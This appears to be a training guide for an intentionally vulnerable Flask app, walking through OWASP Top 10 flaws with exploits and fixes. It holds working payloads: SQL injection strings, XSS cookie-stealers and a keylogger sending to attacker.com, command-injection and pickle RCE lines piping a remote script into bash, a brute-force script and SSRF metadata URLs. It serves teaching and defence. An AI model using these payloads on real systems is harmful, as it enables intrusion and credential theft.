# VulnPlayground â€” OWASP Top 10 (2021) Exploitation Guide

> âš ï¸ **This application is intentionally vulnerable. Run locally only. Never expose to the internet.**

---

## Table of Contents

1. [A01 â€“ Broken Access Control](#a01--broken-access-control)
2. [A02 â€“ Cryptographic Failures](#a02--cryptographic-failures)
3. [A03 â€“ Injection (SQLi + XSS + Command Injection)](#a03--injection)
4. [A04 â€“ Insecure Design](#a04--insecure-design)
5. [A05 â€“ Security Misconfiguration](#a05--security-misconfiguration)
6. [A06 â€“ Vulnerable & Outdated Components](#a06--vulnerable--outdated-components)
7. [A07 â€“ Identification & Authentication Failures](#a07--identification--authentication-failures)
8. [A08 â€“ Software & Data Integrity Failures](#a08--software--data-integrity-failures)
9. [A09 â€“ Security Logging & Monitoring Failures](#a09--security-logging--monitoring-failures)
10. [A10 â€“ Server-Side Request Forgery (SSRF)](#a10--server-side-request-forgery-ssrf)
11. [Secure Setup](#secure-setup)

---

## A01 â€“ Broken Access Control

> **OWASP Definition:** Restrictions on what authenticated users are allowed to do are not properly enforced, allowing attackers to access unauthorized data or functions.

### Vulnerability 1: IDOR (Insecure Direct Object Reference)

**Location:** `/note/<id>`

**Vulnerable Code:**
```python
@app.route("/note/<int:note_id>")
@login_required
def view_note(note_id):
    conn = get_db()
    note = conn.execute("SELECT * FROM notes WHERE id=?", (note_id,)).fetchone()
    # MISSING: ownership check â€” any user can read any note
    return render_template("note.html", note=note)
```

**How to Exploit:**
1. Log in as `alice / password`
2. Navigate to `/note/1` â€” this is the **admin's** private note
3. You can read it despite being alice

```
GET /note/1   â†’ Returns admin's secret note
GET /note/2   â†’ Returns alice's note (your own)
GET /note/3   â†’ Returns bob's note (unauthorized)
```

**Impact:**
- Horizontal privilege escalation (user â†” user)
- Vertical privilege escalation (user â†’ admin data)
- Full data breach: any note, document, record accessible to any logged-in user

**Secure Code:**
```python
@app.route("/note/<int:note_id>")
@login_required
def view_note(note_id):
    conn = get_db()
    note = conn.execute("SELECT * FROM notes WHERE id=?", (note_id,)).fetchone()
    if not note:
        abort(404)
    # âœ… Enforce ownership
    if note["user_id"] != session["user_id"] and session.get("role") != "admin":
        abort(403)
    return render_template("note.html", note=note)
```

---

### Vulnerability 2: Session Cookie Forgery (Privilege Escalation to Admin)

**Location:** `/admin`

**Vulnerable Code:**
```python
app.secret_key = "supersecretkey123"  # Hardcoded, weak secret

# Role checked from forged session cookie, not verified against DB
if session.get("role") != "admin":
    return render_template("access_denied.html"), 403
```

**How to Exploit:**

Install `flask-unsign`:
```bash
pip install flask-unsign
```

Decode the current session:
```bash
flask-unsign --decode --cookie "<paste your session cookie>"
```

Sign a new session with admin role:
```bash
flask-unsign --sign \
  --cookie "{'role': 'admin', 'user_id': 1, 'username': 'admin'}" \
  --secret "supersecretkey123"
```

Replace your `session` cookie in the browser with the forged value, then visit `/admin`.

**Impact:**
- Any user can escalate to admin
- Full access to SSNs, PII, all balances
- Application-wide privilege bypass

**Secure Fix:**
```python
import secrets
app.secret_key = secrets.token_hex(32)  # âœ… Random, stored in env var

# âœ… Always verify role from DB, not session
@app.route("/admin")
@login_required
def admin_panel():
    conn = get_db()
    user = conn.execute("SELECT role FROM users WHERE id=?", (session["user_id"],)).fetchone()
    if not user or user["role"] != "admin":
        abort(403)
    ...
```

```bash
# Store in environment, not source code:
export SECRET_KEY=$(python -c "import secrets; print(secrets.token_hex(32))")
```

---

## A02 â€“ Cryptographic Failures

> **OWASP Definition:** Sensitive data exposed due to weak or missing cryptography, including data at rest, in transit, and in cookies.

### Vulnerability 1: MD5 Password Hashing

**Location:** `app.py` â€“ `init_db()` and `/login`

**Vulnerable Code:**
```python
pw_hash = hashlib.md5(password.encode()).hexdigest()
```

**How to Exploit:**

Extract the hash via SQL injection (see A03), then crack instantly:
```
alice's hash: 5f4dcc3b5aa765d61d8327deb882cf99  â†’ "password"
bob's hash:   5a6f4bf96e5875d88c0d0f97a82b86bd  â†’ "bob123"
```

Use online tools like [crackstation.net](https://crackstation.net) or hashcat:
```bash
hashcat -m 0 -a 0 hashes.txt rockyou.txt
```

**Impact:**
- All passwords crackable in seconds/minutes using rainbow tables
- No salt = identical passwords produce identical hashes
- Credential stuffing attacks trivially feasible

**Secure Code:**
```python
from werkzeug.security import generate_password_hash, check_password_hash

# Store:
pw_hash = generate_password_hash(password, method="pbkdf2:sha256", salt_length=16)

# Verify:
if check_password_hash(user["password"], password):
    # authenticated
```

Or with `bcrypt`:
```python
import bcrypt
pw_hash = bcrypt.hashpw(password.encode(), bcrypt.gensalt(rounds=12)).decode()
# Verify:
bcrypt.checkpw(password.encode(), stored_hash.encode())
```

---

### Vulnerability 2: Sensitive Data in Plaintext Cookie

**Location:** `/profile`

**Vulnerable Code:**
```python
resp.set_cookie("user_data", f"id={user['id']}&ssn={user['ssn']}&role={user['role']}")
# No Secure flag, no HttpOnly flag, no encryption
```

**How to Exploit:**
1. Log in and visit `/profile`
2. Open DevTools â†’ Application â†’ Cookies
3. See `user_data` cookie containing plaintext SSN and role
4. On HTTP (not HTTPS), this cookie is sent in cleartext over the network (sniffable with Wireshark/tcpdump)

**Impact:**
- SSN exfiltrated from any XSS payload: `fetch('https://attacker.com/?c='+document.cookie)`
- Role value can be modified client-side (tamper with `role=admin`)
- PII exposed in browser storage and network traffic

**Secure Fix:**
```python
# âœ… Never store PII in cookies
# âœ… Use server-side sessions (Flask-Session)
# âœ… Set security flags on all cookies

from flask_session import Session
app.config["SESSION_TYPE"] = "filesystem"  # server-side

# If you must use cookies:
resp.set_cookie(
    "session_token",
    value=signed_token,          # HMAC-signed opaque token only
    httponly=True,               # JS cannot read it
    secure=True,                 # HTTPS only
    samesite="Strict",           # CSRF protection
    max_age=3600
)
```

---

## A03 â€“ Injection

> **OWASP Definition:** User-supplied data is sent to an interpreter as part of a command or query, allowing attackers to execute unintended commands or access data without authorization.

### Vulnerability 1: SQL Injection â€“ Authentication Bypass

**Location:** `/login`

**Vulnerable Code:**
```python
query = f"SELECT * FROM users WHERE username='{username}' AND password='{pw_hash}'"
user = conn.execute(query).fetchone()
```

**How to Exploit:**

**Bypass login (no password needed):**
```
Username: admin' --
Password: anything

â†’ Query becomes: SELECT * FROM users WHERE username='admin' --' AND password='...'
â†’ The -- comments out the password check
```

**Login as any user without knowing the password:**
```
Username: ' OR '1'='1' --
Password: anything

â†’ Returns the first user in the database (admin)
```

**Extract all data (error-based):**
Enter as username:
```sql
' AND 1=CAST((SELECT group_concat(username||':'||password) FROM users) AS INTEGER)--
```
The error message will contain `admin:5f4dcc3b5aa765d61d8327deb882cf99,...`

**Impact:**
- Authentication bypass without credentials
- Full database exfiltration
- In some configurations: file read/write, RCE via `INTO OUTFILE`

**Secure Code:**
```python
# âœ… Always use parameterized queries
conn = get_db()
user = conn.execute(
    "SELECT * FROM users WHERE username = ? AND password = ?",
    (username, pw_hash)
).fetchone()

# âœ… Even better â€” use an ORM like SQLAlchemy
from sqlalchemy import text
result = db.execute(
    text("SELECT * FROM users WHERE username = :u AND password = :p"),
    {"u": username, "p": pw_hash}
)
```

---

### Vulnerability 2: SQL Injection â€“ UNION-based Data Extraction

**Location:** `/search?q=`

**Vulnerable Code:**
```python
sql = f"SELECT id, username, email FROM users WHERE username LIKE '%{query_param}%'"
```

**How to Exploit:**

Find the number of columns (3):
```
/search?q=' UNION SELECT NULL,NULL,NULL--
```

Extract passwords:
```
/search?q=' UNION SELECT id,username,password FROM users--
```

Dump the entire users table including SSNs:
```
/search?q=' UNION SELECT username,password,ssn FROM users--
```

Read system files (SQLite):
```
/search?q=' UNION SELECT 1,2,sqlite_version()--
```

**Secure Code:**
```python
results = conn.execute(
    "SELECT id, username, email FROM users WHERE username LIKE ?",
    (f"%{query_param}%",)   # âœ… Parameter binding â€” input is treated as data, not SQL
).fetchall()
```

---

### Vulnerability 3: Stored XSS

**Location:** `/board`

**Vulnerable Code (template):**
```html
<p>{{ m.content | safe }}</p>  {# |safe disables Jinja2 auto-escaping #}
```

**How to Exploit:**

Post these messages on the board:

**Session hijacking:**
```html
<script>
  fetch("https://attacker.com/steal?c=" + encodeURIComponent(document.cookie));
</script>
```

**Keylogger:**
```html
<script>
  document.addEventListener('keydown', e =>
    fetch('https://attacker.com/keys?k='+e.key));
</script>
```

**Image-based (filter bypass):**
```html
<img src=x onerror="alert(document.cookie)">
```

**SVG-based:**
```html
<svg onload="alert(1)">
```

**Impact:**
- Session cookie theft â†’ account takeover
- Credential harvesting via fake login overlay
- Persistent: executes for every user who loads the page
- Can spread laterally (XSS worm)

**Secure Code:**
```python
# âœ… Sanitize with bleach before storing
import bleach
ALLOWED_TAGS = ["b", "i", "em", "strong"]
content = bleach.clean(request.form["content"], tags=ALLOWED_TAGS, strip=True)
```

```html
{# âœ… Never use |safe â€” let Jinja2 auto-escape #}
<p>{{ m.content }}</p>
```

Also set Content Security Policy header:
```python
@app.after_request
def set_csp(response):
    response.headers["Content-Security-Policy"] = (
        "default-src 'self'; script-src 'self'; object-src 'none';"
    )
    return response
```

---

### Vulnerability 4: Reflected XSS

**Location:** `/greet?name=`

**How to Exploit:**
```
/greet?name=<script>alert(document.cookie)</script>
/greet?name=<img src=x onerror=alert(1)>
```

Share the crafted URL with a victim. When they click it, the script executes in their browser.

**Secure Code:**
```html
{# âœ… Remove |safe filter #}
<h2>Hello, {{ name }}!</h2>
```

---

### Vulnerability 5: OS Command Injection

**Location:** `/ping`

**Vulnerable Code:**
```python
output = subprocess.check_output(f"ping -c 2 {host}", shell=True, ...)
```

**How to Exploit:**
```
host: 127.0.0.1; id
host: 127.0.0.1 && cat /etc/passwd
host: 127.0.0.1 | whoami
host: $(cat /etc/shadow)
host: 127.0.0.1; curl https://attacker.com/shell.sh | bash
```

**Impact:**
- Remote Code Execution on the server
- Full system compromise
- Data exfiltration, reverse shell, pivot to internal network

**Secure Code:**
```python
import re, subprocess

# âœ… Validate input strictly
if not re.match(r"^[a-zA-Z0-9.\-]{1,253}$", host):
    return "Invalid hostname", 400

# âœ… Use list form (no shell=True) â€” arguments are never interpreted as shell commands
output = subprocess.check_output(
    ["ping", "-c", "2", host],   # âœ… list, not string
    shell=False,                  # âœ… no shell
    timeout=10
).decode()
```

---

## A04 â€“ Insecure Design

> **OWASP Definition:** Missing or ineffective security controls arising from design flaws, not implementation bugs.

### Vulnerability: No CSRF Protection + Negative Transfer Amounts

**Location:** `/transfer`

**How to Exploit (CSRF Attack):**

Host this HTML on an attacker-controlled site. When the victim (logged in to VulnPlayground) visits it, $1000 is transferred to the attacker:

```html
<!-- attacker.com/steal.html -->
<html>
<body onload="document.forms[0].submit()">
  <form action="http://127.0.0.1:5000/transfer" method="POST">
    <input name="to_user" value="1">      <!-- attacker's user id -->
    <input name="amount" value="1000">
    <input name="note" value="gift">
  </form>
</body>
</html>
```

**How to Exploit (Negative Amount / Business Logic):**

Send `-500` as the amount to drain $500 FROM the target and credit yourself:
```
to_user: 2 (alice)
amount: -500
```

**Impact:**
- CSRF: any website can trigger authenticated actions on behalf of the victim
- Business logic flaw: funds stolen without limit
- No rate limiting: can loop indefinitely

**Secure Code:**
```python
from flask_wtf.csrf import CSRFProtect

csrf = CSRFProtect(app)  # Automatically validates CSRF tokens on all POST forms

# In form template:
# <input type="hidden" name="csrf_token" value="{{ csrf_token() }}">

# âœ… Validate amount server-side
if amount <= 0:
    return "Invalid amount", 400
if amount > 10000:
    return "Transfer limit exceeded", 400
```

---

## A05 â€“ Security Misconfiguration

> **OWASP Definition:** Insecure default configurations, incomplete configurations, or misconfigured HTTP headers exposing the system to attack.

### Vulnerabilities in VulnPlayground:

| Issue | Location | Risk |
|---|---|---|
| `DEBUG=True` | `app.py` | Interactive debugger = RCE |
| Hardcoded `secret_key` | `app.py` | Session forgery |
| Verbose SQL error output | `/login` | Leaks query structure |
| `/api/health` exposes internals | `app.py` | Info disclosure |
| No security headers | All routes | XSS, clickjacking, MIME sniffing |

**How to Exploit (Debug Mode RCE):**

When `app.run(debug=True)`, Flask shows an interactive Python console on every error page. Click the console icon and execute arbitrary code:
```
>>> import os; os.system("id")
```

**How to Exploit (Info Disclosure):**
```
GET /api/health

{
  "secret_key": "supersecretkey123",
  "db_path": "/home/user/VulnPlayground/VulnPlayground.db",
  "debug": true,
  "flask_version": "2.0.3"
}
```

**Secure Code:**
```python
import os

app.secret_key = os.environ["SECRET_KEY"]  # âœ… from env var
app.config["DEBUG"] = False                # âœ… always False in production

# âœ… Security headers
@app.after_request
def security_headers(response):
    response.headers["X-Content-Type-Options"] = "nosniff"
    response.headers["X-Frame-Options"] = "DENY"
    response.headers["X-XSS-Protection"] = "1; mode=block"
    response.headers["Strict-Transport-Security"] = "max-age=31536000; includeSubDomains"
    response.headers["Content-Security-Policy"] = "default-src 'self';"
    response.headers["Referrer-Policy"] = "strict-origin-when-cross-origin"
    return response

# âœ… Remove /api/health or require authentication + remove sensitive fields
```

---

## A06 â€“ Vulnerable & Outdated Components

> **OWASP Definition:** Using components with known vulnerabilities â€” libraries, frameworks, or other software modules â€” that attackers can use to cause serious data loss or take over a server.

### Demonstration:

**Check for known vulnerabilities:**
```bash
pip install safety
safety check -r requirements.txt
```

```bash
# Or use pip-audit
pip install pip-audit
pip-audit
```

**In a Node.js project:**
```bash
npm audit
```

**VulnPlayground uses deliberately old versions:**
- `flask==2.0.3` â€” lacks security defaults added in 2.3+
- `werkzeug==2.0.3` â€” CVE-2023-25577 (multipart DoS)
- `requests==2.27.1` â€” older TLS handling

**Secure Practices:**
```bash
# âœ… Pin to latest secure versions
pip install flask werkzeug requests --upgrade

# âœ… Automate with Dependabot (GitHub) or Renovate
# âœ… Use a Software Bill of Materials (SBOM)
# âœ… Integrate safety/pip-audit into CI/CD pipeline

# requirements.txt â€” pin with hashes for integrity
flask==3.0.3 --hash=sha256:...
```

---

## A07 â€“ Identification & Authentication Failures

> **OWASP Definition:** Weaknesses in authentication and session management that allow attackers to compromise passwords, keys, or session tokens.

### Vulnerabilities:

| Issue | Location |
|---|---|
| No account lockout | `/login` |
| No rate limiting | `/login`, `/register` |
| Weak password accepted | `/register` |
| MD5 hashing | All password storage |
| Session not invalidated | `/logout` |
| Predictable session secret | `app.py` |

**How to Exploit (Brute Force â€” no lockout):**
```python
import requests

url = "http://127.0.0.1:5000/login"
passwords = open("rockyou.txt").read().splitlines()

for pw in passwords:
    r = requests.post(url, data={"username": "admin", "password": pw})
    if "dashboard" in r.url or "Invalid" not in r.text:
        print(f"Found: {pw}")
        break
```

**Secure Code:**
```python
from flask_limiter import Limiter
from flask_limiter.util import get_remote_address

limiter = Limiter(app, key_func=get_remote_address)

@app.route("/login", methods=["POST"])
@limiter.limit("5 per minute")  # âœ… Rate limit
def login():
    ...

# âœ… Password complexity validation
import re
def is_strong_password(pw):
    return (
        len(pw) >= 12 and
        re.search(r"[A-Z]", pw) and
        re.search(r"[a-z]", pw) and
        re.search(r"\d", pw) and
        re.search(r"[!@#$%^&*]", pw)
    )

# âœ… Lockout after 5 failed attempts (track in DB or Redis)
# âœ… Implement MFA for sensitive actions
# âœ… Rotate session after login (prevents session fixation)
session.clear()
session["user_id"] = user["id"]
```

---

## A08 â€“ Software & Data Integrity Failures

> **OWASP Definition:** Code and infrastructure that does not protect against integrity violations â€” including insecure deserialization and using components from untrusted sources without signature verification.

### Vulnerability: Insecure Deserialization (RCE via pickle)

**Location:** `/prefs`

**Vulnerable Code:**
```python
decoded = base64.b64decode(data)
obj = pickle.loads(decoded)   # NEVER do this with untrusted input
```

**How to Exploit:**

Generate the malicious payload locally:
```python
import pickle, base64, os

class RCE:
    def __reduce__(self):
        # This OS command runs when unpickled
        return (os.system, ("id > /tmp/pwned && curl https://attacker.com/shell.sh | bash",))

payload = base64.b64encode(pickle.dumps(RCE())).decode()
print(payload)
```

Paste the base64 output into the Preferences form and submit. The OS command executes server-side.

**Impact:**
- Remote Code Execution â€” complete server takeover
- Can pivot to internal network, install backdoors, exfiltrate databases
- One of the most severe vulnerability classes

**Secure Code:**
```python
import json

# âœ… Use JSON for user preferences â€” no code execution possible
@app.route("/prefs", methods=["POST"])
@login_required
def prefs():
    raw = request.form.get("prefs_data", "{}")
    try:
        prefs = json.loads(raw)   # âœ… JSON only â€” data, not code
        # Validate against schema
        allowed_keys = {"theme", "language", "notifications"}
        prefs = {k: v for k, v in prefs.items() if k in allowed_keys}
    except json.JSONDecodeError:
        return "Invalid preferences format", 400
```

If you must deserialize binary objects, use signed formats:
```python
from itsdangerous import URLSafeSerializer

s = URLSafeSerializer(app.secret_key)
# Serialize:
token = s.dumps({"theme": "dark"})
# Deserialize with signature verification:
data = s.loads(token)  # Raises BadSignature if tampered
```

---

## A09 â€“ Security Logging & Monitoring Failures

> **OWASP Definition:** Insufficient logging, monitoring, and alerting that prevents detection and response to active breaches.

### What's Missing in VulnPlayground (Intentional):

- âŒ No logging of failed login attempts
- âŒ No alerting on multiple failures from same IP
- âŒ No audit trail for transfers or admin actions
- âŒ No structured log format
- âŒ No monitoring / SIEM integration

**Why it matters:** Attackers can brute-force, exfiltrate data, and operate for months without detection. The average time to detect a breach (MTTD) is ~200 days without proper logging.

**Secure Code:**
```python
import logging
from logging.handlers import RotatingFileHandler

# âœ… Set up structured logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger("VulnPlayground")
handler = RotatingFileHandler("audit.log", maxBytes=10_000_000, backupCount=5)
handler.setFormatter(logging.Formatter(
    '{"time":"%(asctime)s","level":"%(levelname)s","event":"%(message)s"}'
))
logger.addHandler(handler)

# âœ… Log authentication events
@app.route("/login", methods=["POST"])
def login():
    username = request.form["username"]
    if not user:
        logger.warning(f"FAILED_LOGIN user={username} ip={request.remote_addr}")
        # Track consecutive failures in Redis/DB â†’ lockout after 5
    else:
        logger.info(f"LOGIN_SUCCESS user={username} ip={request.remote_addr}")

# âœ… Log sensitive actions
logger.info(f"TRANSFER from={session['user_id']} to={to_id} amount={amount} ip={request.remote_addr}")

# âœ… Log admin access
logger.warning(f"ADMIN_ACCESS user={session['username']} ip={request.remote_addr}")
```

**Alerting (example with Slack webhook):**
```python
def alert_security(message):
    import requests
    requests.post(SLACK_WEBHOOK, json={"text": f"ðŸš¨ SECURITY ALERT: {message}"})

# Trigger on: 10+ failed logins from same IP in 1 minute
# Trigger on: admin panel access outside business hours
# Trigger on: unusually large transfer amounts
```

---

## A10 â€“ Server-Side Request Forgery (SSRF)

> **OWASP Definition:** A web application fetches a remote resource based on user-supplied URL without proper validation, allowing attackers to make requests from the server to internal services.

### Vulnerability

**Location:** `/fetch`

**Vulnerable Code:**
```python
r = requests.get(url, timeout=5)   # No URL validation â€” fetches anything
```

**How to Exploit:**

**Access internal services (port scanning):**
```
http://127.0.0.1:5000/api/health      â†’ Internal app data
http://127.0.0.1:6379                  â†’ Redis (if running) â€” unauthenticated
http://127.0.0.1:8080                  â†’ Internal admin panel
http://127.0.0.1:27017                 â†’ MongoDB
```

**Cloud metadata exfiltration (critical on AWS/GCP/Azure):**
```
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/
```

The last two URLs return cloud credentials that give full control of the cloud environment.

**Protocol smuggling:**
```
dict://127.0.0.1:11211/stat    â†’ Memcached commands
gopher://127.0.0.1:6379/_*1%0d%0a$4%0d%0aping%0d%0a  â†’ Redis SSRF
```

**Impact:**
- Cloud credential theft â†’ full cloud account takeover
- Internal network traversal
- Bypass firewall rules (the request originates from trusted server)
- Exfiltrate secrets from metadata services

**Secure Code:**
```python
from urllib.parse import urlparse
import ipaddress

ALLOWED_SCHEMES = {"http", "https"}
BLOCKED_HOSTS = {"localhost", "127.0.0.1", "0.0.0.0", "::1",
                  "169.254.169.254", "metadata.google.internal"}

def is_safe_url(url: str) -> bool:
    try:
        parsed = urlparse(url)
        if parsed.scheme not in ALLOWED_SCHEMES:
            return False

        host = parsed.hostname
        if not host or host in BLOCKED_HOSTS:
            return False

        # Block private/internal IP ranges
        try:
            ip = ipaddress.ip_address(host)
            if ip.is_private or ip.is_loopback or ip.is_link_local:
                return False
        except ValueError:
            pass  # It's a hostname, not an IP â€” do DNS resolution check too

        return True
    except Exception:
        return False

@app.route("/fetch", methods=["POST"])
@login_required
def fetch_url():
    url = request.form.get("url", "")
    if not is_safe_url(url):
        return "URL not allowed", 400     # âœ… Allowlist-based validation
    r = requests.get(url, timeout=5, allow_redirects=False)  # âœ… Disable redirects
    ...
```

---

## Secure Setup

### Running VulnPlayground Locally

```bash
# Clone / navigate to the project
cd VulnPlayground

# Create and activate virtual environment
python3 -m venv venv
source venv/bin/activate          # Linux/macOS
# venv\Scripts\activate           # Windows

# Install dependencies
pip install flask requests

# Run the app
python app.py
```

Visit: http://127.0.0.1:5000

### Recommended Tools for Exploitation Practice

| Tool | Purpose |
|---|---|
| [Burp Suite Community](https://portswigger.net/burp) | HTTP intercept proxy, active scanning |
| [SQLMap](https://sqlmap.org) | Automated SQL injection |
| `flask-unsign` | Flask session cookie decoder/forger |
| [OWASP ZAP](https://www.zaproxy.org) | Web app scanner |
| `hashcat` / `john` | Password hash cracking |
| [Caido](https://caido.io) | Modern Burp alternative |

### Testing SQLMap Against VulnPlayground

```bash
sqlmap -u "http://127.0.0.1:5000/search?q=test" \
  --cookie="session=<your session cookie>" \
  --dbs --dump --level=5 --risk=3
```

---

*VulnPlayground is inspired by DVWA, WebGoat, and Juice Shop. Built for educational purposes to demonstrate and understand the OWASP Top 10.*
